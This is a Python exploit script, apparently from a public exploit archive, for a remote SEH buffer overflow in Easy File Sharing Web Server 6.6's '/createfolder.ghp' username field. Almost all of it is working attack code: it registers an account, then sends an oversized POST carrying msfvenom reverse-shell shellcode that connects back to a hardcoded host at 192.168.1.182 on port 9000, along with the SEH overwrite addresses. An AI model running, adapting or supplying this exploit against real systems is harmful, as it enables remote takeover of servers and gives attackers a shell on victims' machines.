# Exploit Title: Easy File Sharing Web Server 6.6 - '/createfolder.ghp' Username Remote Buffer Overflow (SEH)
# Vendor Homepage: http://www.web-file-management.com
# Software Link: http://www.web-file-management.com/efsws.zip
# Exploit author: Felipe Winsnes
# Version: 6.6
# Tested on: Windows 7 x86, Windows 10 x64

#!/usr/bin/python

import socket
import sys
import struct
import os

user = "pentest"
password = "pentest"
mail = "example@example.com"

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 80))

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.182 LPORT=9000 -f py -b "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e" EXITFUNC=thread

buf =  b""
buf += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x97\xf4\x98\xc3\x83\xee\xfc\xe2\xf4\x6b\x1c"
buf += b"\x1a\xc3\x97\xf4\xf8\x4a\x72\xc5\x58\xa7\x1c\xa4\xa8"
buf += b"\x48\xc5\xf8\x13\x91\x83\x7f\xea\xeb\x98\x43\xd2\xe5"
buf += b"\xa6\x0b\x34\xff\xf6\x88\x9a\xef\xb7\x35\x57\xce\x96"
buf += b"\x33\x7a\x31\xc5\xa3\x13\x91\x87\x7f\xd2\xff\x1c\xb8"
buf += b"\x89\xbb\x74\xbc\x99\x12\xc6\x7f\xc1\xe3\x96\x27\x13"
buf += b"\x8a\x8f\x17\xa2\x8a\x1c\xc0\x13\xc2\x41\xc5\x67\x6f"
buf += b"\x56\x3b\x95\xc2\x50\xcc\x78\xb6\x61\xf7\xe5\x3b\xac"
buf += b"\x89\xbc\xb6\x73\xac\x13\x9b\xb3\xf5\x4b\xa5\x1c\xf8"
buf += b"\xd3\x48\xcf\xe8\x99\x10\x1c\xf0\x13\xc2\x47\x7d\xdc"
buf += b"\xe7\xb3\xaf\xc3\xa2\xce\xae\xc9\x3c\x77\xab\xc7\x99"
buf += b"\x1c\xe6\x73\x4e\xca\x9c\xab\xf1\x97\xf4\xf0\xb4\xe4"
buf += b"\xc6\xc7\x97\xff\xb8\xef\xe5\x90\x0b\x4d\x7b\x07\xf5"
buf += b"\x98\xc3\xbe\x30\xcc\x93\xff\xdd\x18\xa8\x97\x0b\x4d"
buf += b"\x93\xc7\xa4\xc8\x83\xc7\xb4\xc8\xab\x7d\xfb\x47\x23"
buf += b"\x68\x21\x0f\xa9\x92\x9c\x58\x6b\x96\x42\xf0\xc1\x97"
buf += b"\xd7\xb0\x4a\x71\x9e\x88\x95\xc0\x9c\x01\x66\xe3\x95"
buf += b"\x67\x16\x12\x34\xec\xcf\x68\xba\x90\xb6\x7b\x9c\x68"
buf += b"\x76\x35\xa2\x67\x16\xff\x97\xf5\xa7\x97\x7d\x7b\x94"
buf += b"\xc0\xa3\xa9\x35\xfd\xe6\xc1\x95\x75\x09\xfe\x04\xd3"
buf += b"\xd0\xa4\xc2\x96\x79\xdc\xe7\x87\x32\x98\x87\xc3\xa4"
buf += b"\xce\x95\xc1\xb2\xce\x8d\xc1\xa2\xcb\x95\xff\x8d\x54"
buf += b"\xfc\x11\x0b\x4d\x4a\x77\xba\xce\x85\x68\xc4\xf0\xcb"
buf += b"\x10\xe9\xf8\x3c\x42\x4f\x78\xde\xbd\xfe\xf0\x65\x02"
buf += b"\x49\x05\x3c\x42\xc8\x9e\xbf\x9d\x74\x63\x23\xe2\xf1"
buf += b"\x23\x84\x84\x86\xf7\xa9\x97\xa7\x67\x16"

seh = struct.pack("<I", 0x100161e5) # pop esi # pop edi # ret
nseh = struct.pack("<I", 0x909006EB)
host = sys.argv[1]
buffer = "A" * 56920 + nseh + seh + buf + "\xcc" * 3000

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print bcolors.OKBLUE + "[*]" + bcolors.ENDC + " Creating account..."

account = "POST /login.htm HTTP/1.1\r\n"
account += "Host:" + host + "\r\n"
account += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
account += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
account += "Accept-Language: en-US,en;q=0.5\r\n"
account += "Accept-Encoding: gzip, deflate\r\n"
account += "Referer: http://" + host + "/register.ghp\r\n"
account += "Content-Type: application/x-www-form-urlencoded\r\n"
account += "Content-Length: 138\r\n"
account += "Connection: close\r\n"
account += "Cookie: SESSIONID=28467; UserID=admin; PassWD=admin; frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201\r\n"
account += "Upgrade-Insecure-Requests: 1\r\n"

account += "frmLogin=true&frmUserID=" + user + "&frmUserPass=" + password + "&frmUserPass2=pentest&Email=" + mail + "&Avatar=&avatarURL=&register=Register%21\r\n"

s.send(account)
s.close

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 80))

print bcolors.OKGREEN + "[+]" + bcolors.ENDC + " Sending payload!"

request = "POST /" + user + " HTTP/1.1\r\n"
request += "Host:" + host + "\r\n"
request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
request += "Accept-Language: en-US,en;q=0.5\r\n"
request += "Accept-Encoding: gzip, deflate\r\n"
request += "Referer: http://" + host + "/createfolder.ghp?vfolder=/"+ user +"/\r\n"
request += "Content-Type: application/x-www-form-urlencoded\r\n"
request += "Content-Length: 10077\r\n"
request += "Connection: close\r\n"
request += "Cookie: SESSIONID=28467; UserID=" + user + "; PassWD=" + password +"; frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201\r\n"
request += "Upgrade-Insecure-Requests: 1\r\n"
request += "upload_author=" + buffer + "&upload_passwd=&folder_des=1&folder_name=1&create_folder=Create\r\n"

s.send(request)
s.close

